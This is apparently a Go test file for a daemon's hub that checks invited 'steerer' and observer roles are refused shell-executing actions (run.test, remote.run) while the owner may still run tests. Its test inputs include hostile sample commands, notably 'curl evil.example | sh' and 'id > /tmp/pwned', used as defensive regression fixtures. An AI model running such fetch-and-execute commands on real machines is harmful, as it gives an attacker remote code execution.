package hub

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"

	"github.com/howlerops/oculus/daemon/crypto"
	"github.com/howlerops/oculus/daemon/protocol"
	"github.com/howlerops/oculus/daemon/transport"
)

// The property under test: NOTHING that executes a caller-supplied command string is reachable by a
// steerer. Roles are enforced in the daemon, so these tests drive the real thing — a real handshake
// over a real (in-memory) socket, a real invite redemption, and the real dispatch — rather than
// asserting on roleAllows. A unit test of the capability table would keep passing if someone changed
// the gate at the call site back to capSteer, which is the exact regression worth catching.

// --- in-memory MsgConn pair (transport needs a duplex message socket, not a byte stream) ---

type gatePipe struct {
	in, out chan []byte
	closed  chan struct{}
}

func newGatePipePair() (*gatePipe, *gatePipe) {
	a2b := make(chan []byte, 32)
	b2a := make(chan []byte, 32)
	return &gatePipe{in: b2a, out: a2b, closed: make(chan struct{})},
		&gatePipe{in: a2b, out: b2a, closed: make(chan struct{})}
}

func (p *gatePipe) WriteMsg(b []byte) error {
	cp := append([]byte(nil), b...)
	select {
	case p.out <- cp:
		return nil
	case <-p.closed:
		return fmt.Errorf("closed")
	}
}

func (p *gatePipe) ReadMsg() ([]byte, error) {
	select {
	case b := <-p.in:
		return b, nil
	case <-p.closed:
		return nil, fmt.Errorf("closed")
	}
}

func (p *gatePipe) Close() error {
	select {
	case <-p.closed:
	default:
		close(p.closed)
	}
	return nil
}

// gateHub returns a hub with device pairing wired to ownerSecret, plus a dial function that connects
// a client presenting some secret. Presenting the owner secret yields an owner connection; presenting
// an invite's secret yields that invite's role (and turns enforcement on, as redeeming always does).
func gateHub(t *testing.T, ownerSecret string) (*Hub, func(secret string) *transport.Conn) {
	t.Helper()
	h := New()
	daemonKP, err := crypto.GenerateKeyPair()
	if err != nil {
		t.Fatalf("daemon keypair: %v", err)
	}
	accept := h.AcceptSecret(ownerSecret)
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)

	return h, func(secret string) *transport.Conn {
		t.Helper()
		clientKP, err := crypto.GenerateKeyPair()
		if err != nil {
			t.Fatalf("client keypair: %v", err)
		}
		cPipe, sPipe := newGatePipePair()
		go func() {
			conn, err := transport.ServerHandshake(sPipe, daemonKP, accept)
			if err != nil {
				return
			}
			_ = h.Serve(ctx, conn)
		}()
		client, err := transport.ClientHandshake(cPipe, clientKP, daemonKP.Public(), secret)
		if err != nil {
			t.Fatalf("client handshake with %q: %v", secret, err)
		}
		t.Cleanup(func() { _ = client.Close() })
		return client
	}
}

// ask sends one request and returns the reply carrying the same id, skipping the unsolicited
// broadcasts (participants, session list) a fresh connection also receives.
func ask(t *testing.T, c *transport.Conn, id, typ string, payload any) protocol.Envelope {
	t.Helper()
	raw, err := protocol.Encode(id, typ, payload)
	if err != nil {
		t.Fatalf("encode %s: %v", typ, err)
	}
	if err := c.Send(raw); err != nil {
		t.Fatalf("send %s: %v", typ, err)
	}
	type result struct {
		env protocol.Envelope
		err error
	}
	ch := make(chan result, 1)
	go func() {
		for {
			raw, err := c.Recv()
			if err != nil {
				ch <- result{err: err}
				return
			}
			env, err := protocol.Decode(raw)
			if err != nil || env.ID != id {
				continue
			}
			ch <- result{env: env}
			return
		}
	}()
	select {
	case r := <-ch:
		if r.err != nil {
			t.Fatalf("recv reply to %s: %v", typ, r.err)
		}
		return r.env
	case <-time.After(5 * time.Second):
		t.Fatalf("no reply to %s", typ)
		return protocol.Envelope{}
	}
}

// errMessage returns the human text of an error reply, or "" if the reply wasn't an error.
func errMessage(t *testing.T, env protocol.Envelope) string {
	t.Helper()
	if env.Type != protocol.TypeError {
		return ""
	}
	var e protocol.Error
	if err := env.Unmarshal(&e); err != nil {
		t.Fatalf("decode error payload: %v", err)
	}
	return e.Message
}

// TestSteererCannotRunShellCommands is the hole this closes. run.test hands its Command straight to
// `/bin/sh -c` on the daemon's machine, so an invited steerer holding it held arbitrary code
// execution as the owner — through a button labelled "run tests".
func TestSteererCannotRunShellCommands(t *testing.T) {
	h, dial := gateHub(t, "owner-secret")
	inv := h.invites.create("Sam", RoleSteerer, time.Hour)
	steerer := dial(inv.Secret)

	env := ask(t, steerer, "req-1", protocol.TypeRunTest,
		protocol.RunTest{SessionID: "no-such-session", Command: "id > /tmp/pwned"})
	msg := errMessage(t, env)
	if msg == "" {
		t.Fatalf("a steerer must be refused run.test, got a %s reply", env.Type)
	}
	// The refusal has to be legible, not merely correct: the client renders the button unconditionally,
	// so a generic failure reads as a bug and gets retried.
	if !strings.Contains(msg, "owner") {
		t.Errorf("the refusal must say it's owner-only, got %q", msg)
	}
	if !strings.Contains(msg, "run tests") {
		t.Errorf("the refusal must name the action the user tried, got %q", msg)
	}
	if !strings.Contains(msg, "shell") {
		t.Errorf("the refusal must explain why this one action is owner-only, got %q", msg)
	}
}

// TestOwnerMayRunTests: the gate closes on steerers without taking the feature away from the person
// whose machine it is. (SessionID is unknown, so runTest finds no workspace root and returns before
// building an argv — the ack is what's under test, and nothing is executed.)
func TestOwnerMayRunTests(t *testing.T) {
	h, dial := gateHub(t, "owner-secret")
	// Enforcement ON — otherwise every connection is the owner by default and the test proves nothing.
	h.SetRolesEnabled(true)
	owner := dial("owner-secret")

	env := ask(t, owner, "req-1", protocol.TypeRunTest,
		protocol.RunTest{SessionID: "no-such-session", Command: "true"})
	if env.Type != protocol.TypeOK {
		t.Fatalf("the owner must be allowed to run tests, got %s: %q", env.Type, errMessage(t, env))
	}
}

// TestSteererCannotStartRemoteSession is the same hole one hop away: remote.run splices its
// AgentCommand into `ssh <host> "cd … && <cmd>"`, which the remote login shell executes — with the
// owner's ssh key. Registering the host is already owner-only; choosing what runs on it has to be too,
// or the host gate protects nothing.
func TestSteererCannotStartRemoteSession(t *testing.T) {
	h, dial := gateHub(t, "owner-secret")
	inv := h.invites.create("Sam", RoleSteerer, time.Hour)
	steerer := dial(inv.Secret)

	env := ask(t, steerer, "req-1", protocol.TypeRemoteRun,
		protocol.RemoteRun{HostID: "some-host", AgentCommand: "curl evil.example | sh"})
	msg := errMessage(t, env)
	if msg == "" {
		t.Fatalf("a steerer must be refused remote.run, got a %s reply", env.Type)
	}
	if !strings.Contains(msg, "owner") {
		t.Errorf("the refusal must say it's owner-only, got %q", msg)
	}
}

// TestObserverRefusalStillPointsAtTheOwner: raising these two gates must not have made the ordinary
// watching-a-session case worse. An observer gets the message that tells them what to do about it.
func TestObserverRefusalStillPointsAtTheOwner(t *testing.T) {
	h, dial := gateHub(t, "owner-secret")
	inv := h.invites.create("Pat", RoleObserver, time.Hour)
	observer := dial(inv.Secret)

	env := ask(t, observer, "req-1", protocol.TypeSessionPrompt,
		protocol.SessionPrompt{SessionID: "no-such-session", Text: "hello"})
	msg := errMessage(t, env)
	if !strings.Contains(msg, "permission to steer") {
		t.Errorf("an observer should be told to ask for steer, got %q", msg)
	}
}
